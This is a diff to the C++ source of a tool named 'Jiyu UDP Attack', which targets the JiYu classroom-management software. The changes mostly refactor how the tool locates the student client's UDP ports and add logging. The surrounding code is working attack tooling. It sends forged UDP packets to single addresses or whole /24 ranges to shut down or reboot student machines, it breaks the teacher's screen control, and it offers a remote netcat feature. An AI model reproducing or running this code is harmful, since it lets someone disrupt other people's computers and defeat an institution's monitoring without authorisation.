@@ -43,11 +43,13 @@ class Logger {
         int curLevel = Warning;
 };
 
-std::string execCmd(std::string cmd, Logger* logger);
-
 int strToInt(std::string str);
 
 std::vector<BYTE> formatANSIString(const std::string str);
+
+std::vector<DWORD> getProcessIdByName(const std::string& processName);
+
+std::string IPDwordToString(DWORD ip);
 
 struct ParamOpt {
     std::string id;
@@ -66,13 +68,19 @@ struct ParamRet {
 std::vector<ParamRet> GetParams(int argc, char *argv[], std::vector<ParamOpt> opts);
 ParamRet GetParamfromParams(std::string id, std::vector<ParamRet> rets);
 
+struct StudentPort {
+    int pid;
+    std::string ip;
+    int port;
+};
+
 class ISocket {
     public:
         ISocket(Logger* logger);
         ~ISocket();
         std::string localIP = "";
         std::vector<std::string> getLocalIPs();
-        std::vector<int> getStudentPorts(std::string IP = "");
+        std::vector<StudentPort> getStudentPorts();
         int send(std::string IP, int port, std::vector<BYTE> data);
     private:
         WSADATA wsd;
@@ -119,6 +127,7 @@ DWORD WINAPI netcat_remote(LPVOID lpParameter);
 
 Logger::Logger(FILE* fp, int level) : fp(fp) {
     if(level >= Debug && level <= None) this->curLevel = level;
+    this->log(Info, "Logger initialized.");
 };
 
 Logger::~Logger() {
@@ -153,27 +162,6 @@ void Logger::log(int level, std::string content, Args... args) {
     fprintf(fp, ("[" + getTime() + "|" + levelStr + "] " + content + "\n").c_str(), args...);
 }
 
-std::string execCmd(std::string cmd, Logger* logger) {
-    char buf_ps[1024] = {};
-    char ps[1024] = {0};
-    char result[2048] = {};
-    auto ptr = new FILE;
-    strcpy(ps, cmd.c_str());
-    if((ptr = _popen(ps, "r")) != NULL) {
-        while(fgets(buf_ps, 1024, ptr) != NULL) {
-            strcat(result, buf_ps);
-            if(strlen(result) > 1024) break;
-        }
-        _pclose(ptr);
-        ptr = NULL;
-        return result;
-    }
-    else {
-        logger->log(Logger::Error, "Failed to popen %s", ps);
-        return "";
-    }
-}
-
 int strToInt(std::string str) {
     int ret = 0;
     for(auto i: str) {
@@ -188,6 +176,33 @@ std::vector<BYTE> formatANSIString(const std::string str) {
     MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, wide, num);
     std::vector<BYTE> ret((num - 1) * sizeof(wchar_t));
     memcpy(&ret[0], wide, (num - 1) * sizeof(wchar_t));
+    return ret;
+}
+
+std::vector<DWORD> getProcessIdByName(const std::string& processName) {
+    std::vector<DWORD> pid;
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (Process32First(snapshot, &entry)) {
+        do {
+            if (processName == entry.szExeFile) {
+                pid.push_back(entry.th32ProcessID);
+                break;
+            }
+        } while (Process32Next(snapshot, &entry));
+    }
+
+    CloseHandle(snapshot);
+    return pid;
+}
+
+std::string IPDwordToString(DWORD ip) {
+    WORD hiWord=HIWORD(ip);
+    WORD loWord=LOWORD(ip);
+    char ret[20];
+    sprintf(ret, "%d.%d.%d.%d", LOBYTE(loWord), HIBYTE(loWord), LOBYTE(hiWord), HIBYTE(hiWord));
     return ret;
 }
 
@@ -231,6 +246,7 @@ ParamRet GetParamfromParams(std::string id, std::vector<ParamRet> rets) {
 }
 
 ISocket::ISocket(Logger* logger): logger(logger) {
+    logger->log(Logger::Info, "Initializing ISocket...");
     if(WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
         logger->log(Logger::Error, "执行 WSAStartup 失败。");
         return;
@@ -243,10 +259,11 @@ ISocket::ISocket(Logger* logger): logger(logger) {
     }
     setsockopt(client, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(int));
 
-    std::vector<std::string> localIPs = getLocalIPs();
-    for(auto IP: localIPs) {
-        if(getStudentPorts(IP).size()) {
-            localIP = IP;
+    auto localIPs = getLocalIPs();
+    auto studentPorts = getStudentPorts();
+    for(auto port: studentPorts) {
+        if(std::find(localIPs.begin(), localIPs.end(), port.ip) != localIPs.end()) {
+            localIP = port.ip;
             break;
         }
     }
@@ -255,6 +272,7 @@ ISocket::ISocket(Logger* logger): logger(logger) {
         if(localIPs.size()) localIP = localIPs[0];
         else logger->log(Logger::Warning, "未能获取合适的 IP。");
     }
+    logger->log(Logger::Info, "ISocket initialized.");
 }
 
 ISocket::~ISocket() {
@@ -282,31 +300,34 @@ std::vector<std::string> ISocket::getLocalIPs() {
     return ret;
 }
 
-std::vector<int> ISocket::getStudentPorts(std::string IP) {
-    if(IP == "") IP = localIP;
-    std::vector<int> ret;
-
-    std::string taskStudent = execCmd("tasklist | findstr \"Student\"", logger);
-    std::regex pattern("[e]\\s*\\d{1,5}\\s*[C]");
-    std::smatch matches;
-    if(!std::regex_search(taskStudent, matches, pattern)){
+std::vector<StudentPort> ISocket::getStudentPorts() {
+    std::vector<StudentPort> ret;
+    auto studentMainPid = getProcessIdByName("StudentMain.exe");
+    if(studentMainPid.empty()) {
         logger->log(Logger::Warning, "进程 StudentMain.exe 未找到。返回空结果。");
         return ret;
     }
-    std::string studentPID = matches[0];
-    studentPID = studentPID.substr(1, studentPID.size() - 2);
-    while(!isprint(studentPID.front())) studentPID.erase(studentPID.begin());
-    while(!isprint(studentPID.back())) studentPID.pop_back();
-
-    std::string netstat = execCmd("netstat -ano | findstr \"" + studentPID + "\"", logger);
-    pattern = std::regex(IP + ":\\d{1,5}\\s*[*]");
-    while(std::regex_search(netstat, matches, pattern)) {
-        std::string portStr = matches[0];
-        portStr = portStr.substr(IP.size() + 1, portStr.size() - IP.size() - 2);
-        while(!isprint(portStr.back())) portStr.pop_back();
-        int port = strToInt(portStr);
-        ret.push_back(port);
-        netstat = matches.suffix().str();
+    logger->log(Logger::Info, "Getting %d Student Terminal pid(s)...", (int)studentMainPid.size());
+    DWORD dwBufferSize = 0;
+    GetExtendedUdpTable(NULL, &dwBufferSize, true, AF_INET, UDP_TABLE_OWNER_PID, 0);
+    MIB_UDPTABLE_OWNER_PID *pMibUdpTable = (MIB_UDPTABLE_OWNER_PID*)malloc(dwBufferSize);
+    DWORD dwRet = GetExtendedUdpTable(pMibUdpTable, &dwBufferSize, true, AF_INET, UDP_TABLE_OWNER_PID, 0);
+    if(dwRet != NO_ERROR) {
+        logger->log(Logger::Error, "获取 UDP 端口列表失败。错误码：%lu", dwRet);
+        return ret;
+    }
+    for(int i = 0; i < (int)pMibUdpTable->dwNumEntries; i++) {
+        if(std::find(
+            studentMainPid.begin(),
+            studentMainPid.end(),
+            pMibUdpTable->table[i].dwOwningPid
+        ) != studentMainPid.end()) {
+            ret.push_back({
+                (int)pMibUdpTable->table[i].dwOwningPid,
+                IPDwordToString(pMibUdpTable->table[i].dwLocalAddr),
+                ntohs(pMibUdpTable->table[i].dwLocalPort)
+            });
+        }
     }
     return ret;
 }
@@ -329,6 +350,7 @@ int ISocket::send(std::string IP, int port, std::vector<BYTE> data) {
 JiYu_Attack::JiYu_Attack() {
     logger = new Logger(stdout, Logger::Error);
     client = new ISocket(logger);
+    logger->log(Logger::Info, "JiYu_Attack initialized.");
 }
 
 const std::vector<BYTE> JiYu_Attack::cmdCodePrefix[4] = {
@@ -370,11 +392,13 @@ std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
     std::vector<std::string> ret;
     std::regex pattern("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
     if(std::regex_match(rawIP, pattern)) {
+        logger->log(Logger::Info, "IP parsed. Type: origin.");
         ret.push_back(rawIP);
         return ret;
     }
     pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))-(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
     if(std::regex_match(rawIP, pattern)) {
+        logger->log(Logger::Info, "IP parsed. Type: '-' segment.");
         std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
         std::string lStr = rawIP.substr(rawIP.rfind('.') + 1, rawIP.find('-') - rawIP.rfind('.') - 1);
         std::string rStr = rawIP.substr(rawIP.find('-') + 1);
@@ -386,6 +410,7 @@ std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
     }
     pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-5]))/24$");
     if(std::regex_match(rawIP, pattern)) {
+        logger->log(Logger::Info, "IP parsed. Type: class C.");
         std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
         for(int i = 1; i < 255; i++) {
             ret.push_back(segPrefix + std::to_string(i));
@@ -482,6 +507,7 @@ int JiYu_Attack::sendPkg(std::string rawIP, int port, std::vector<BYTE> data) {
     data.resize((std::max)((int)data.size(), 1024));
     auto IPs = IPParser(rawIP);
     if(IPs.empty()) return 4;
+    logger->log(Logger::Info, "Sending data package with %d bytes to raw IP %s parsed into %d IPs...", (int)data.size(), rawIP.c_str(), (int)IPs.size());
     int ret = 0;
     for(auto IP: IPs) {
         ret |= client->send(IP, port, data);
@@ -518,10 +544,62 @@ std::istream& getCleanedLine(std::string &str, bool clean = true) {
     return ret;
 }
 
+DWORD WINAPI runSystemVer(LPVOID lpParameter) {
+    (void)(lpParameter);
+    char ps[1024] = "Ver", buf_ps[1024] = {};
+    auto ptr = _popen(ps, "r");
+    bool ret = 1;
+    if(ptr != NULL) {
+        while(fgets(buf_ps, 1024, ptr) != NULL);
+        ret = _pclose(ptr);
+        ptr = NULL;
+    }
+    return ret;
+}
+
+void pressEscape() {
+    HWND hwnd;
+    char pszNewWindowTitle[1024];
+    char pszOldWindowTitle[1024];
+    GetConsoleTitle(pszOldWindowTitle, 1024);
+    wsprintf(pszNewWindowTitle, "Pressing escape to stop pausing... %d/%d", GetTickCount(), GetCurrentProcessId());
+    SetConsoleTitle(pszNewWindowTitle);
+    Sleep(100);
+    hwnd = FindWindow(NULL, pszNewWindowTitle);
+    SetConsoleTitle(pszOldWindowTitle);
+    if(hwnd) {
+        WORD dwScanCode = MapVirtualKey(VK_ESCAPE, MAPVK_VK_TO_VSC);
+        DWORD dwVKFkeyData = 1 | dwScanCode << 16 | 0 << 24 | 1 << 29;
+        SendMessage(hwnd, WM_KEYDOWN, VK_ESCAPE, dwVKFkeyData);
+        SendMessage(hwnd, WM_CHAR, VK_ESCAPE, dwVKFkeyData);
+        SendMessage(hwnd, WM_KEYUP, VK_ESCAPE, dwVKFkeyData | 3 << 30);
+        return;
+    }
+    keybd_event(VK_ESCAPE, 0, 0, 0);
+    keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
+}
+
+bool checkCMDAvailability() {
+    HANDLE hThread = CreateThread(NULL, 0, runSystemVer, NULL, 0, NULL);
+    Sleep(100);
+    DWORD exitCode;
+    GetExitCodeThread(hThread, &exitCode);
+    if(exitCode == STILL_ACTIVE) pressEscape();
+    WaitForSingleObject(hThread, 100);
+    CloseHandle(hThread);
+    return !exitCode;
+}
+
 auto jyAtk = new JiYu_Attack;
 
 void startUI() {
+    bool isCMDAvailable = checkCMDAvailability();
+
     printf("------------------- GitHub Repository -------------------\n    https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp\n\nJiyu UDP Attack Cpp 用户界面\n输入指令以继续。输入 help 以获取帮助。输入 exit 以退出。\n");
+
+    if(!isCMDAvailable) {
+        printf("警告：无法使用 CMD 命令行。某些功能可能无法使用。\n");
+    }
 
     std::string opt, IP;
     int port = 4705, ncport = 8888, loopCount = 1, loopInterval = 22;
@@ -624,13 +702,13 @@ void startUI() {
                 for(auto i: localIPs) {
                     printf("%s\n", i.c_str());
                 }
+                auto studentPorts = jyAtk->client->getStudentPorts();
                 std::vector<int> ports;
-                for(auto i: localIPs) {
-                    auto port = jyAtk->client->getStudentPorts(i);
-                    ports.insert(ports.end(), port.begin(), port.end());
+                for(auto port: studentPorts) {
+                    if(std::find(localIPs.begin(), localIPs.end(), port.ip) != localIPs.end()) {
+                        ports.push_back(port.port);
+                    }
                 }
-                std::sort(ports.begin(), ports.end());
-                ports.erase(std::unique(ports.begin(), ports.end()), ports.end());
                 printf("\n学生端监听的端口：");
                 if(ports.size()) {
                     putchar('\n');
@@ -647,7 +725,10 @@ void startUI() {
             }
         }
         else if(extraOpt == "break" || extraOpt == "continue") {
-            if((extraOpt == "break" ? jyAtk->breakScreenControl() : jyAtk->continueScreenControl()) == 3) {
+            if(!isCMDAvailable) {
+                printf("无法使用 CMD 命令行，执行失败。\n");
+            }
+            else if((extraOpt == "break" ? jyAtk->breakScreenControl() : jyAtk->continueScreenControl()) == 3) {
                 printf("需要管理员权限。\n");
             }
             else printf(extraOpt == "break" ? "已退出屏幕控制。\n" : "已恢复屏幕控制。\n");
@@ -660,6 +741,10 @@ void startUI() {
             loopSend(loopCount, loopInterval, jyAtk, extraOpt == "r" ? &JiYu_Attack::sendReboot : &JiYu_Attack::sendShutdown, IP, port);
         }
         else if(extraOpt == "nc") {
+            if(!isCMDAvailable) {
+                printf("无法使用 CMD 命令行，执行失败。\n");
+                continue;
+            }
             if(IP == "") {
                 printf("缺少 IP。\n");
                 continue;
@@ -714,13 +799,13 @@ int main(int argc, char *argv[]) {
                 printf("未找到\n");
                 return 0;
             }
+            auto studentPorts = jyAtk->client->getStudentPorts();
             std::vector<int> ports;
-            for(auto i: localIPs) {
-                auto port = jyAtk->client->getStudentPorts(i);
-                ports.insert(ports.end(), port.begin(), port.end());
+            for(auto port: studentPorts) {
+                if(std::find(localIPs.begin(), localIPs.end(), port.ip) != localIPs.end()) {
+                    ports.push_back(port.port);
+                }
             }
-            std::sort(ports.begin(), ports.end());
-            ports.erase(std::unique(ports.begin(), ports.end()), ports.end());
             printf("\n学生端监听的端口：");
             if(ports.size()) {
                 putchar('\n');
